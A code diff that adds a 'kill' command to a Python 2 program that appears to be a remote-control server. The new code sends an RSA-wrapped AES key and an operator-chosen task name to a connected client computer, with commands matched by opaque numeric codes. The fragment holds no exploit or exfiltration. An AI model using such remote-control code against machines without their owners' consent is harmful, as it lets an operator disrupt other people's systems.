@@ -535,6 +535,27 @@ while True:
                 print output
 
 
+            # 'kill'
+            elif int(float(command)) == -1346507244:
+                kill_AES = AES256()
+
+                ae_key17 = kill_AES.get_key()
+                apubKey17 = RSA.import_key(known_hosts[0])
+                encryptor17 = PKCS1_OAEP.new(apubKey17)
+                e_key17 = encryptor17.encrypt(ae_key17)
+
+                send_one_message(conn, e_key17)
+
+                task = raw_input("Enter in task you would like to kill on client computer -> ")
+
+                send_one_message(conn, kill_AES.encrypt(task))
+
+                eoutput = recv_one_message(conn)
+                output = kill_AES.decrypt(eoutput, kill_AES.get_key())
+
+
+
+
 
             elif int(float(command)) == 603295412:
                 print "Exiting ... "
